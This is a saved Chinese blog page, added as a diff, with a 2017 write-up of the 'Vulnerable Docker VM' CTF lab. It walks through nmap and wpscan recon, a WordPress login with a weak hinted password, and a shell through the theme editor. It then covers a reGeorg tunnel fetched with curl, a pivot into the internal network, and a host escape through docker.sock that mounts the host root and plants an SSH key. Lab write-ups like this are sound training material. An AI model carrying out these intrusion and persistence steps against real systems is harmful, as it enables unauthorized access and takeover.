@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>Vulnerable Docker VM WriteUp - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="Vulnerable Docker VM WriteUp - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/775/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>Vulnerable Docker VM WriteUp</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2017-09-27 04:46"><i class="iconfont icon-date"></i>2017-09-27 04:46</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>半夜发烧睡不着，看到一个有意思的类CTF的题目，就看了下。</p>
+
+<p>https://www.notsosecure.com/vulnerable-docker-vm/ 可以下载一个虚拟机镜像，导入后开机会提示虚拟机的IP。先使用 nmap 扫描一下</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Nmap scan report for 192.168.30.171
+Host is up (0.00057s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8000/tcp open  http-alt
+</code></pre>
+</div>
+
+<p>开启了 ssh，但是没有密码无法登陆，8000 端口是一个 WordPress，有一些文章和 robots.txt ，大致翻了下，没有什么有用的信息。</p>
+
+<p>用 wpscan 扫了一下，发现有个注入，就是我上一篇文章提到的，并没什么用，没有安装插件，但是有一个叫 bob 的用户。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Identified the following 1 user/s:
++----+-------+-----------------+
+| Id | Login | Name            |
++----+-------+-----------------+
+| 1  | bob   | bob – NotSoEasy |
++----+-------+-----------------+
+</code></pre>
+</div>
+
+<p>然后看了眼 hint，用户的密码是 <code class="highlighter-rouge">Welcome1</code>（其实应该用字典跑的），就这样进入了后台，在草稿箱中发现了第一个 flag。</p>
+
+<p><img src="https://storage.virusdefender.net/blog/images/775/1.jpg" alt="" /></p>
+
+<p>如果可以进入 wp 的后台，那么拿 shell 就很简单了，使用在线编辑功能就可以。</p>
+
+<p><img src="https://storage.virusdefender.net/blog/images/775/2.jpg" alt="" /></p>
+
+<p>连上 shell 后收集了下面的一些信息</p>
+
+<ul>
+  <li>数据库</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>define('DB_NAME', 'wordpress');
+define('DB_USER', 'wordpress');
+define('DB_PASSWORD', 'WordPressISBest');
+define('DB_HOST', 'db:3306');
+</code></pre>
+</div>
+
+<ul>
+  <li>系统是 <code class="highlighter-rouge">Linux 8f4bca8ef241 3.13.0-128-generic #177-Ubuntu SMP Tue Aug 8 11:40:23 UTC 2017 x86_64 GNU/Linux</code>，用户是 <code class="highlighter-rouge">www-data</code>，这么新的系统直接就可以放弃提权了，否则 Dirty COW 之类的洞还是超级好用的，可以参考 <a href="https://ricterz.me/posts/Tunnel%20Manager%20-%20From%20RCE%20to%20Docker%20Escape">Tunnel Manager - From RCE to Docker Escape</a></li>
+</ul>
+
+<p><img src="https://storage.virusdefender.net/blog/images/775/3.jpg" alt="" /></p>
+
+<ul>
+  <li><code class="highlighter-rouge">ip addr</code></li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+5: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.2/16 scope global eth0
+       valid_lft forever preferred_lft forever
+</code></pre>
+</div>
+
+<p><img src="https://storage.virusdefender.net/blog/images/775/4.jpg" alt="" /></p>
+
+<p>想起题目是<code class="highlighter-rouge">Vulnerable Docker VM</code>，猜想应该就是 <code class="highlighter-rouge">docker.sock</code> 或者 HTTP API 未授权访问之类的问题，不过翻了下没找到什么。</p>
+
+<p>但是看机器的 IP，感觉这个虚拟机里面应该还有个 docker network 的内网，简单的 ping 了下，发现至少是存在 <code class="highlighter-rouge">172.18.0.1-4</code> 的，这时候需要做一下内网穿透，这样方便在我的电脑上操作，否则 shell 里面缺少很多工具和依赖，比较麻烦。</p>
+
+<p>我使用的是 <a href="https://github.com/sensepost/reGeorg">reGeorg</a></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>curl -o tunnel.php https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.nosocket.php
+</code></pre>
+</div>
+
+<p>浏览器访问了一下，显示 <code class="highlighter-rouge">Georg says, 'All seems fine'</code>。</p>
+
+<p>本地电脑上运行 <code class="highlighter-rouge">python reGeorgSocksProxy.py -u http://192.168.30.171:8000/tunnel.php</code></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>[INFO   ]  Log Level set to [INFO]
+[INFO   ]  Starting socks server [127.0.0.1:8888], tunnel at [http://192.168.30.171:8000/tunnel.php]
+[INFO   ]  Checking if Georg is ready
+[INFO   ]  Georg says, 'All seems fine'
+</code></pre>
+</div>
+
+<p>因为 reGeorg 提供的是 socks5 代理，所以需要本地使用 proxychains，具体配置不多说了。</p>
+
+<p><code class="highlighter-rouge">proxychains mysql -u wordpress -pWordPressISBest -h 172.18.0.4</code> 连接数据库，但是并没有找到什么 flag，然后继续扫内网，还是 nmap 那一堆命令加上 proxychains 前缀就好。然后发现一个 IP 有个奇怪的端口</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Nmap scan report for 172.18.0.3
+Host is up (0.0062s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8022/tcp open  oa-system
+</code></pre>
+</div>
+
+<p>curl 看了下，貌似是一个网页，然后在设置了浏览器的 socks5 代理，就看到了，原来是一个网页版 ssh，而且这里面终于有了 <code class="highlighter-rouge">docker.sock</code>。</p>
+
+<p><img src="https://storage.virusdefender.net/blog/images/775/7.jpg" alt="" /></p>
+
+<p>接下来就是老套路了，可以参考 <a href="http://www.silence.com.cn/docker%E5%AD%A6%E4%B9%A0%E4%B8%8Eremote-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8/920">Docker学习与remote API未授权访问分析和利用</a></p>
+
+<p>而我是直接在里面安装了一个docker，这样就可以操作主机上的 docker 了。</p>
+
+<p><img src="https://storage.virusdefender.net/blog/images/775/8.jpg" alt="" /></p>
+
+<p>然后使用 volume 挂载主机上的所有文件到一个目录</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>docker run -it --rm -v /:/vol wordpress /bin/bash
+</code></pre>
+</div>
+
+<p>这样就可以看到 flag3了</p>
+
+<p><img src="https://storage.virusdefender.net/blog/images/775/9.jpg" alt="" /></p>
+
+<p>然后在 <code class="highlighter-rouge">/vol/root/.ssh</code> 下面又把自己的公钥写了进去，这样就可以直接 ssh 到虚拟机了。</p>
+
+<p><img src="https://storage.virusdefender.net/blog/images/775/10.jpg" alt="" /></p>
+
+<p>至于 flag2 去哪了，官方的说法是他们忘了放了，233333</p>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=Vulnerable Docker VM WriteUp&article_id=/index.php/archives/775/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
